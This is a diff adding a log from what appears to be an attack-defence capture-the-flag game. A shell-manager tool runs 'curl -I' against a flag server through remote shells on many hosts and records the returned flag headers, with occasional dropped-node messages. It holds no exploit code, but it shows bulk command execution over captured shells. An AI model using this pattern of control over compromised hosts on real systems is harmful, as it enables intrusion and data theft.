@@ -1,0 +1,189 @@
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.104:57252 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: qoD8mVdGIEraMDY6Q64pskK0es1ccM1bFO2X5dl96HZ8fAixBX6I7QrxmIyQxW8+h550DdfZkR0S+YOFnZZLOUv9SsusldXZBhpKoXh3JbIDkgW+B/UxxvAQWZNtf4LAmugSnW6oUWrZcmjvwyI94ZAZ/7LEObOL30Wm6+sid4k=
+Date: Thu, 16 Aug 2018 07:25:26 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:27.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.102:50196 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: AzmnAd/d2hCvh+9g1eoLK3ityVb4G3ZbiXrp1FsR4bvP+SwbOu7AbqrLmm2D756XTpw4Jq+35Vrwvt8GjkYG5hYxyCvecf7grG+PAEgu1wyxEI/rV3f8zNhBH4Ik0jC/qC7RJj1724L+Hg81MColEtztHc5Z89YsGFPH6Hz9EcU=
+Date: Thu, 16 Aug 2018 07:25:27 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:27.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.116:50196 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: jKMH0hhz6iSXS/B1AXwDT1+30h1wI95g9B7Hb1uBPTtjWoj1o+rLrkb9Orzm37DscIrtUpaY5PxAp6Jp56xuOp5C2UHI1gh0xvznPG0GhCGnjEZ3AmnjL+UsK06psxHfJtZyyacdIcv8zhiGxXT5uRTdpR6xi/I+FI+iOsAN+Ho=
+Date: Thu, 16 Aug 2018 07:25:27 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:28.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.115:58194 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: hq4RUPma0aeoGJVrUR9c/ldZ9c65/JWh4bVLg97dxj+MCksBvtyY+JGC9AKPx/Lx9tZtJ5kooIdImUksHFJMckILrMDBOS1dTLbrHsjaaIdAlHbin7foiTjQReMwqfVFHMEH60A4p2RE6ePjxSDcfvq1+hzskiV7c1zrU9Xvfns=
+Date: Thu, 16 Aug 2018 07:25:28 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:28.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.108:45760 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: mxFsV1cXz/AdlPV6OKIvbn+OG+AT5x1tppz8bEw0enh4pjBZ/cMjTiHChxNQZScx577cXKiRh3Pefa5/9Sg2K+diH+C45seELIkU5EueUZvF+ja5wPYPCvWEtgOCJ1flhT3+CI5DH1VMf7MwsEq7u67lp7kY+wrkXSTNIGTGxIU=
+Date: Thu, 16 Aug 2018 07:25:28 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:29.log
+[+] Command : curl -I http://10.233.66.66
+[-] Removing Node!
+[+] Receving data from socket 10.0.3.109:45838 ...
+[+]
+[+] Log file : ./log/2018-08-16_15:25:29.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.115:41852 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: pkdJBjkHTK8EnzPxWTVnIpAEWuqQJEeKMYjod7Sj6ke3+J+udYGbuPZwZiiiMLJxSUwBXbvPH7CrKDaSlhc9KyeC38pX//fRGzwoolP9LLBl8O+QPQXoNlVhvFR6sXK1rkJSifgODF1V6W2HpezXdp/JqWcp+iNB0zZWkCquOrM=
+Date: Thu, 16 Aug 2018 07:25:29 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:30.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.102:49272 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: ln2nxhrn0M4tVFoL1GyCzn2/xkVHVQU8hxcEhk+4lHYXhgIjGuJLbIYm9ZU6AUiCzQhfA4quwkhYVtTxZ5NIIheC56a8A83owm+InT0LfkStwiPvF1Jv2loNqD/kX5kSqgd4O7iC5OEJ/zYNTKUrX8qiP/YcqeSNFf0/GMZp7Qw=
+Date: Thu, 16 Aug 2018 07:25:30 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:30.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.112:56550 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: k1XbAN3ZhNB2CNQOP9TntuADDIjFV3JTDnlYomZsRmcF5cMwICcmiRkqimZL+6aIXL38SkynqOlpEgG3dbcZG42AisEurhBprupqnsbxq9Z6jP/zmWfNXDVuNYT/iKJ9G0KT1N8/rrsDEI3X3sHXXoTHle7do1zg+bUU6vtw8x4=
+Date: Thu, 16 Aug 2018 07:25:30 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:31.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.108:34418 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: O05l4PM3aU67xyRiVcgPifRfGeuNRv2/4WoFEfectlySP6fWSvKHz2CXLmpaZEhwkg5/4PVlUHxbicmDSnNjnpeo9z6TLcwH+8GY0fgoO+przXZ5qjdmqJxjWGbvsuWQI17z8dNXieZhpx73ZkKnRUykxbDXItXRVtq90yqjQrM=
+Date: Thu, 16 Aug 2018 07:25:31 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:31.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.112:59948 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: l5q/SphEWRepKctnp67kQn316fIxfzdreLYtbsej4RJgHHFqMBHBf4C/KRwKxtIVfqXUjpDQsyqktK+JLVEPV2ZZVfuChfuYx3y1jKPlTxSzlG/ksY8FM84Fm4fSQQDbdYo+A3PU54iK790VwJzXO8O5UJd79gCV1Z3MTXxYZHA=
+Date: Thu, 16 Aug 2018 07:25:31 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:32.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.104:53958 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: SSAxGAY1WkbeJ1EdPG8j8b9JFcSkyLkjprR0SejsBK0YWdGIDeu2mq/3Ptqm1nzuljCNpV6QyYXPTVMN7jZ2TEVazQtrsIUt5T2ioDIXAMko2cbculk5O8fz0Ylo2u4Zzn+ldP3PfGqhPAgyDykzi/lqePtKFHgfIKg6DEzx2OQ=
+Date: Thu, 16 Aug 2018 07:25:32 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:32.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.106:58540 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: TV+ed1L5qhiU+8F7jdK5lqrfVlI7Tuj/wzVxrNy4AQHUn+Wq/66Wwi2jVKvky2O7KHNbFlDqPzXoTxIGRinkDR2Cj4/JbyUSKb81heoh5r6SGsarc/pIXTj8p5MbazQxaKKvRSdP1SEYKH2rlDlh11ioYtywZslZQY5iEeaPK7Q=
+Date: Thu, 16 Aug 2018 07:25:32 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:33.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.116:48552 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: 1Fvs8Ysnkl39JqAn0DDwWsQWi/Lu50alrbADMjYkO7J8INfJQj/BBZ1C/D1DDbbGNj+5ISaxWhLb+jQ1vZYi9RUzEIFyGsLjbGkJV1VAmvGaWpbWp8yKrc4+RnhqeOUW2DPiaHKIvYDmewvuS4d24z3VfH4ZP05XLNi01RRVzfc=
+Date: Thu, 16 Aug 2018 07:25:33 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:33.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.103:35154 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: 1G9v08w8nSNZDeqzZ8Jfn4Ii7bSAyI/aH8d7rYwyUd1aSnm2wP53uKIeumgzlGIg19DQDxGWwSPBeIobxYfXPwjEgEYHHlufDXdCzid+CxGNx/43sRxsdvstztlBkuWqaFjFubyPkJ57iB1ReetORf3qyVWyoTGuy2RU/uhO55A=
+Date: Thu, 16 Aug 2018 07:25:33 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:34.log
+[+] Command : curl -I http://10.233.66.66
+[+] Receving data from socket 10.0.3.109:39460 ...
+[+] curl -I http://10.233.66.66
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+HTTP/1.1 200 OK
+Flag: 18AJGj79pr0OahHwWdHOR3tDLMzJ1VKQ5/4GzSKpdgZEpIzle4RNeptGHt01ePTWssaONGNdOhSNaU9vHqA7a98BQRCKTTPPq2PXMDHRoHyy9wJ66Hw0yk4WhThSFEzC1t+NG0ACY9xgo7L5Ldts3e+DUFgORCKa8dB10fmxUAQ=
+Date: Thu, 16 Aug 2018 07:25:34 GMT
+
+sh-4.2$
+[+] Log file : ./log/2018-08-16_15:25:34.log
+[+] Command : curl -I http://10.233.66.66
+[-] Removing Node!
+[+] Receving data from socket 10.0.3.109:42762 ...
+[+]
